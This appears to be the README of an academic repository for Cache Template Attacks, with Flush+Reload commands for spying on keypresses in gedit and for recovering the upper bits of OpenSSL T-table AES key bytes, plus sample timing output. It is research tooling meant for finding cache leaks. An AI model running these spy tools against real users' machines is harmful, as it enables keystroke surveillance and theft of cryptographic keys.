# Cache Template Attacks
This repository contains several tools to perform Cache Template Attacks and OpenSSL AES T-Table attack.

Cache Template Attacks are a new generic attack technique, allowing to profile and exploit cache-based information leakage of any program automatically, without prior knowledge of specific software versions or even specific system information.

The underlying cache attack used in this repository is Flush+Reload as presented by Yarom and Falkner in "[FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/yarom)" (2014).

The "[Cache Template Attacks](https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/gruss)" paper by Gruss, Spreitzer and Mangard was published at USENIX Security 2015.

## One note before starting

The programs should work on x86-64 Intel CPUs independent of the operating system (as long as you can compile it). Different OS specific version of the tools are provided in subfolders.

**Warning:** This code is provided as-is. You are responsible for protecting yourself, your property and data, and others from any risks caused by this code. This code may not detect vulnerabilities of your applications. This code is only for testing purposes. Use it only on test systems which contain no sensitive data.

## Getting started: Calibration
Before starting the Cache Template Attack you have to find the cache hit/miss threshold of your system.

Use the calibration tool for this purpose:
```
cd calibration
make
./calibration 10
```
This program should print a histogram for cache hits and cache misses. The number specifies the bucket size for the histogram.

## Profiling
In this example we perform some steps by hand to illustrate what happens in the background.
Therefore, we will first find the address range to attack.
```
cat /proc/`pidof gedit`/maps | grep libgedit | grep "r-x"
7fe0674cf000-7fe067511000 r-xp 0001d000 103:04 2768721                   /usr/lib/x86_64-linux-gnu/gedit/libgedit-44.so
```
We do not care about the virtual addresses, but only the size of the address range and the offset in the file (which is 00000000 in this example). This is also the reason why we don't have to think about address space layout randomization.

**Note:** On Windows you can use the tool vmmap to find the same information.

This line can directly be passed to the profiling tool in the following step. We will create a Cache Template in this step.

During the profiling you need to perform or simulate a huge number of key presses. The profiling tool gives you 2 seconds of time to switch windows, e.g., to an already opened gedit window.

On Linux, run the following lines:
```
cd profiling
make
./spy 155 100 7fe0674cf000-7fe067511000 r-xp 0001d000 103:04 2768721                   /usr/lib/x86_64-linux-gnu/gedit/libgedit-44.so
```

Choose a cache line with a nice number of cache hits and pass it to the generic exploitation spy tool:
```
cd exploitation
make
./spy 155 /usr/lib/x86_64-linux-gnu/gedit/libgedit-44.so 0x22980
```
Now this tool prints a message exactly when a user presses a key (in gedit).
This spy tool can also be used on Windows just like that.

**Note:** Cache Template Attacks can be fully automated, but this requires the event to be automated as well.

## OpenSSL AES T-Table attack

### Manual attack - Profiling phase
In order to enable the T-Table based AES implementation, the use of a self-compiled OpenSSL library is  required. Additionally, `libcrypto.so.1.0.0` need to be placed in the folder `profiling_aes_example` and the program must run it as a shared library.  
Then run
```
cd profiling_aes_example
make
./spy
```
 
The small set of frequently accessed addresses (*i.e.*, 64) makes it easy to locate the T-table in the log file.  
To successfully complete the *profiling* phase, the initial encryptions run should be performed using a dummy key (included in `spy.cpp` code), for example:  
```
0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,   
0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
```

In this phase, the goal is to observe 64 consecutive offsets showing a "*diagonal pattern*" and to understand the range used during the encryption; here's an example of profiling the first key byte with `NUMBER_OF_ENCTRYPTION` = 1200:  
```
0x16e540,2100,1925,1924,1923,1949,1928,1934,1933,1921,1926,1926,1900,1921,1942,1938,1933
0x16e580,1925,2100,1929,1922,1917,1924,1908,1945,1916,1911,1931,1935,1945,1928,1942,1938
0x16e5c0,1924,1917,2100,1937,1915,1942,1906,1931,1941,1939,1936,1934,1945,1958,1935,1909
0x16e600,1940,1912,1925,2100,1928,1929,1920,1911,1926,1920,1927,1926,1933,1928,1938,1926
0x16e640,1928,1916,1943,1932,2098,1918,1947,1943,1919,1915,1928,1906,1910,1939,1923,1932
0x16e680,1930,1930,1910,1924,1946,2100,1938,1950,1902,1931,1915,1943,1909,1921,1922,1934
0x16e6c0,1919,1932,1925,1915,1919,1913,2100,1937,1915,1908,1939,1915,1922,1915,1927,1918
0x16e700,1930,1932,1929,1935,1926,1942,1926,2100,1922,1937,1951,1927,1938,1951,1941,1942
0x16e740,1908,1932,1937,1931,1914,1921,1927,1947,2100,1903,1945,1923,1935,1897,1927,1936
0x16e780,1950,1949,1933,1945,1930,1939,1945,1948,1932,2099,1938,1942,1924,1919,1911,1907
0x16e7c0,1929,1921,1922,1928,1947,1924,1933,1934,1932,1924,2100,1930,1917,1935,1920,1943
0x16e800,1937,1934,1924,1900,1924,1934,1938,1930,1936,1910,1935,2100,1908,1941,1925,1933
0x16e840,1913,1914,1938,1936,1946,1939,1930,1932,1917,1946,1932,1938,2100,1917,1928,1937
0x16e880,1938,1934,1928,1932,1941,1945,1938,1942,1930,1944,1943,1923,1941,2100,1926,1933
0x16e8c0,1928,1908,1949,1930,1928,1926,1936,1931,1940,1919,1918,1926,1921,1917,2098,1930
0x16e900,1934,1923,1929,1932,1935,1938,1946,1927,1901,1950,1935,1927,1936,1934,1935,2100
```

Obviously, it's important to have a pattern with 2100 cycles along the diagonal, or values very close to 2100, such as 2099 or 2098.


### Manual attack - Exploitation phase
Subsequently, you can monitor addresses from the profile to derive information about secret keys.

In the expoitation phase, the spy tool must trigger encryptions itself using the realistic key - comment out the dummy key (or replace/add a realistic key) and run the encryptions. After 64 encryptions, the upper 4 bits of each key byte can be trivially determined.  

The following lines show an example of output for the first key byte (in fact we can see the same offsets of the previous example):  
```
0x16e540,1916,1910,1918,1930,1953,2100,1912,1923,1936,1926,1947,1926,1941,1929,1934,1921
0x16e580,1930,1946,1923,1923,2100,1936,1907,1947,1901,1906,1952,1934,1927,1952,1920,1934
0x16e5c0,1926,1929,1945,1930,1926,1934,1951,2099,1950,1943,1928,1956,1915,1913,1944,1956
0x16e600,1939,1904,1934,1932,1939,1917,2100,1941,1923,1915,1918,1930,1934,1955,1911,1920
0x16e640,1921,2100,1933,1926,1929,1937,1922,1924,1925,1932,1939,1928,1929,1933,1931,1928
0x16e680,2100,1930,1951,1936,1905,1929,1932,1917,1917,1932,1913,1928,1898,1943,1937,1919
0x16e6c0,1937,1941,1921,2100,1918,1931,1896,1938,1925,1925,1915,1931,1920,1924,1928,1943
0x16e700,1914,1944,2100,1905,1928,1926,1920,1944,1923,1934,1917,1946,1915,1940,1916,1943
0x16e740,1925,1941,1927,1933,1935,1915,1942,1926,1908,1938,1937,1932,1930,2100,1924,1921
0x16e780,1931,1933,1933,1926,1926,1938,1935,1927,1930,1929,1935,1923,2099,1941,1947,1920
0x16e7c0,1951,1944,1933,1915,1935,1937,1917,1924,1929,1914,1929,1920,1920,1940,1945,2100
0x16e800,1948,1923,1908,1937,1932,1944,1937,1934,1940,1951,1919,1945,1924,1917,2100,1939
0x16e840,1921,1938,1942,1918,1940,1958,1940,1909,1920,2099,1938,1907,1923,1929,1927,1939
0x16e880,1912,1942,1940,1933,1922,1919,1949,1936,2100,1914,1915,1931,1926,1943,1946,1944
0x16e8c0,1919,1901,1937,1907,1940,1932,1950,1923,1948,1931,1904,2098,1916,1930,1922,1918
0x16e900,1930,1937,1951,1920,1931,1945,1935,1936,1904,1922,2100,1940,1918,1961,1931,1932
```

To perform the attack manually, repeat this process for each key byte; after completing all runs you will obtain the upper 4 bits of every key byte. Note that if you proceed manually you will also need to appropriately modify the corresponding sections of `spy.cpp` between runs (for example toggling the dummy/real key, adjusting the target byte index, ecc...). If you prefer to automate the process, see the following section.

### Semi-automatic attack
If you prefer to test `spy.cpp` atomatically, you can configure `libcrypto.so.1.0.0` as described above and then run the tool:
```
cd profiling_aes_example
python3 run_attack.py
```

This tool automates both the profiling and exploitation phases: it modifies and executes the necessary code and generates the corresponding output files. For reasons of execution time and readability, the tests are performed only on the first 4 bytes of the key by default, but you can modify `run_attack.py` to run the attack on all key bytes (note that completing the full process will require significantly more time depending on your hardware).

Of course, we know that OpenSSL does not use a T-Table-based AES implementation anymore. But you can use this tool to profile any (possibly closed-source) binary to find whether it contains a crypto algorithm which leaks key dependent information through the cache. Just trigger the algorithm execution with fixed keys 


That's it, now it's up to you to find out which of your software leaks data and how it could be exploited. I hope it helps you closing these leaks.
